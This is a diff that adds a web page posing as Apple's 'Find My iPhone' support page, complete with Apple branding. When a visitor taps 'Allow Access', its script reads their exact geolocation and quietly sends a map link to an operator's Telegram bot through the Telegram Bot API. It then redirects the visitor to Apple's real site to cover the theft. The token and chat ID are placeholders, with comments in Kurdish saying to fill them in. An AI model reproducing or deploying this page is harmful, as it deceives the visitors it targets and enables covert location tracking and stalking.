@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Find My iPhone | Apple Support</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f2f2f7; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        .container { text-align: center; padding: 20px; width: 90%; max-width: 400px; background: white; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        img { width: 80px; margin-bottom: 20px; }
+        h1 { font-size: 22px; font-weight: 600; margin-bottom: 10px; color: #1d1d1f; }
+        p { font-size: 15px; color: #86868b; margin-bottom: 30px; line-height: 1.4; }
+        .btn { background-color: #007aff; color: white; border: none; padding: 15px 40px; font-size: 17px; font-weight: 500; border-radius: 12px; cursor: pointer; width: 100%; transition: background 0.3s; }
+        .btn:active { background-color: #0056b3; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
+    <h1>Find Your Device</h1>
+    <p>To locate your lost device or nearby Apple Store, please allow location access to continue.</p>
+    <button class="btn" onclick="requestIOSLocation()">Allow Access</button>
+</div>
+
+<script>
+function requestIOSLocation() {
+    // ڕێکخستنی زۆر ورد بۆ ئایفۆن
+    const options = {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+    };
+
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                // بەکارهێنانی Telegram Bot API بۆ وەرگرتنی ئەنجامەکە (باشترین ڕێگە بۆ ئایفۆن)
+                const token = "لێرە_تۆکن_دابنێ";
+                const chat_id = "لێرە_ئایدی_دابنێ";
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                const msg = `📍 **NEW IPHONE LOCATION**\n\nLink: ${mapLink}`;
+
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
+                .then(() => {
+                    window.location.href = "https://www.apple.com/icloud/find-my/";
+                });
+            },
+            (err) => {
+                window.location.href = "https://www.apple.com/icloud/find-my/";
+            },
+            options
+        );
+    }
+}
+</script>
+</body>
+</html>
